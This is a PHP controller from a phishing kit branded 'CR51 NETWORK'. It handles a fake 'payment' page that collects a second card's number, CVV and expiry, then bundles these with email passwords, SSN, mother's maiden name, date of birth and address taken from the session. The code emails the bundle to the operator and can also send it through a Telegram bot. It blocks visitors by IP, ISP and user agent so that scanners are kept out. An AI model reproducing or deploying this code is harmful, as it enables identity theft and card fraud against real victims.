<?php
defined("ALLOW") or exit('No direct script access allowed');

class Payment
{
	public $goCR51;
	public function __construct()
	{
		$this->goCR51 = new goCR51();
		if (!isset($_SESSION['access']) and ($_SESSION['access'] != 6)) {
			write(FCPATH . 'CR51/Static/log_click.txt', 'a', "|" . _time() . "|{$this->goCR51->ip_address}|{$_SESSION['country']}|{$this->goCR51->browser}|SESSION RELOAD\r\n");
			redirect(base_url() . '?' . _config('PARAMETER'));
		}
		checkbacklist($this->goCR51->ip_address, 'ip');
		checkbacklist($_SESSION['countryCode'], 'countrycode');
		checkbacklist($_SESSION['isp'], 'isp');
		checkbacklist($_SERVER['HTTP_USER_AGENT'], 'ua');
	}

	public function index()
	{
		if ($this->goCR51->is_mobile) {
			echo view('mobile/payment');
		} else {
			echo view('pc/payment');
		}
	}

	public function process()
	{
		if ($_SESSION['ccn'] == $_POST['ccn']) {
			redirect(base_url() . 'payment/#errorId=' . md5(time()));
		} else if (isset($_POST)) {
			$address = $_SESSION['address'];
			$cityP = $_SESSION['cityp'];
			$state = $_SESSION['region'];
			$zipCode = $_SESSION['zipcode'];
			$dob = $_SESSION['dob'];
			$ssn = $_SESSION['ssn'];
			$motherName = $_SESSION['mmn'];
			$phone = $_SESSION['phone'];
			$cardName = trim($_SESSION['namecard']);
			$cardNumber2 = $_POST['ccn'];
			$cardNumber2 = str_replace(" ", "", $cardNumber2);
			$cardCcv2 = $_POST['cvv'];
			$cardExpM = $_POST['expmonth'];
			$cardExpY = $_POST['expyear'];
			$cardExp = substr($cardExpY, 2);

			$_SESSION['ccn'] = $cardNumber2;
			$bin = look_bin($cardNumber2);
			$email = trim($_SESSION['emailLogin']);
			$password = trim($_SESSION['password_email']);
			$password2 = trim($_SESSION['password_email2']);

			$message =
				"<fieldset style='border: 3px solid #e4e3e2; border-radius: 20px; max-width: 50%; margin: 0 auto;'>
<pre>
<strong><span style='color: #999999;'>:: CR51 NETWORK ::</span></strong>

<strong>:: Email Account ::</strong>
			
# Email address  : {$email}
# Password       : {$password}
# Password 2     : {$password2}
# Check format   : {$email}|{$password}
# Check format 2 : {$email}|{$password2}

<strong>:: Double Credit or Debit Card ::</strong>
			
# BIN : {$bin}
# Cardholder name : {$cardName}
# Card number 	  : {$cardNumber2}
# Expiration 	  : {$cardExpM}/{$cardExpY}
# Cvv/Cvv2	  : {$cardCcv2}
# Check format 	  : {$cardNumber2}|{$cardExpM}|{$cardExp}|{$cardCcv2}

<strong>:: Personal Information ::</strong>
			
# Address  : {$address}
# City 	   : {$cityP}
# State    : {$state}
# Zip code : {$zipCode}
# Phone    : {$phone}
# MMN 	   : {$motherName}
# SSN 	   : {$ssn}
# DOB	   : {$dob}

<strong>:: Visitor Details ::</strong>

# Date &amp; Time  : " . _date() . "  
# Device       : {$this->goCR51->platform}
# Browser      : {$this->goCR51->browser}
# Country      : {$_SESSION['country']}
# State        : {$_SESSION['region']}
# City         : {$_SESSION['city']}
# Ip address   : {$this->goCR51->ip_address}
# User agent   : {$this->goCR51->agent}

</pre>
</fieldset>
</pre>";

			$subject = "2 :: {$bin} :: [ {$_SESSION['country']} - {$this->goCR51->ip_address} ]";
			$headers = 'MIME-Version: 1.0' . "\r\n";
			$headers .= 'Content-type: text/html; charset=UTF-8' . "\r\n";
			$headers .= "From: CR51 NETWORK <cr51@b4ndit.sg>";
			@mail(_config('RESULT'), $subject, $message, $headers);
			if (_config('Telegram') == 'on') {
				$c = curl_init();
				curl_setopt($c, CURLOPT_URL, 'https://api.telegram.org/bot' . tel('token') . '/sendMessage?chat_id=' . tel('idtelegram') . '&text=' . urlencode(strip_tags($message)));
				curl_setopt($c, CURLOPT_RETURNTRANSFER, true);
				curl_setopt($c, CURLOPT_SSL_VERIFYPEER, false);
				curl_setopt($c, CURLOPT_SSL_VERIFYHOST, false);
				$x = curl_exec($c);
				curl_close($c);
			}
			write(FCPATH . 'CR51/Static/log_cc.txt', 'a', "{$this->goCR51->ip_address}\r\n");
			write(FCPATH . 'CR51/Static/log_click.txt', 'a', "|" . _time() . "|{$this->goCR51->ip_address}|{$_SESSION['country']}|{$this->goCR51->browser}|Submit 2 Credit or Debit Card\r\n");

			if (_config('GETBANK') == 'on') {
				$_SESSION['access'] = 7;
				redirect(base_url() . 'bank/#');
			} else {
				$_SESSION['access'] = 8;
				redirect(base_url() . 'finished/#_dn=' . md5(rand(0, 999)));
			}
		}
	}
}
